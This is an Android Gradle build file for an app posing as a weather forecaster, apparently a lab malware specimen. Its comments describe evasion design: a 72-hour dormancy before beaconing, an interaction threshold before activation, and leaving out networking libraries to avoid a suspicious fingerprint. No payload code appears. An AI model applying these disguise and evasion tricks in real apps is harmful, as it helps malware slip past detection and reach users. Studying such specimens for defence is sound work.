plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

android {
    namespace = "com.skyweather.forecast"
    compileSdk = 35

    defaultConfig {
        applicationId = "com.skyweather.forecast"
        minSdk = 26
        targetSdk = 34
        versionCode = 1
        versionName = "2.1.4"

        // Takopii Stage 5: Dormancy period (lab: 30s, production: 259200000L = 72h)
        buildConfigField("long", "DORMANCY_MS", "30000L")

        // Takopii Stage 14: Interaction threshold before activation
        buildConfigField("int", "INTERACTION_THRESHOLD", "10")
    }

    signingConfigs {
        create("release") {
            // Debug keystore for lab specimen — NOT a production signing key
            storeFile = file("${System.getProperty("user.home")}/.android/debug.keystore")
            storePassword = "android"
            keyAlias = "androiddebugkey"
            keyPassword = "android"
        }
    }

    buildTypes {
        release {
            isMinifyEnabled = true
            isShrinkResources = true
            signingConfig = signingConfigs.getByName("release")
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
        }
        debug {
            isMinifyEnabled = false
        }
    }

    buildFeatures {
        buildConfig = true
        viewBinding = true
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }

    kotlinOptions {
        jvmTarget = "17"
    }
}

dependencies {
    // Standard AndroidX — every legitimate app has these
    implementation("androidx.core:core-ktx:1.15.0")
    implementation("androidx.appcompat:appcompat:1.7.0")
    implementation("com.google.android.material:material:1.12.0")
    implementation("androidx.constraintlayout:constraintlayout:2.2.1")
    implementation("androidx.recyclerview:recyclerview:1.4.0")
    implementation("androidx.cardview:cardview:1.0.0")
    implementation("androidx.swiperefreshlayout:swiperefreshlayout:1.1.0")

    // WorkManager — used for periodic data sync (benign justification)
    // Actual use: delayed beacon scheduling (Takopii Stage 5 dormancy)
    implementation("androidx.work:work-runtime-ktx:2.10.0")

    // NO OkHttp, NO Retrofit, NO Gson — offensive code uses stdlib only
    // Reduces suspicious dependency fingerprint (Takopii Stage 13)
}
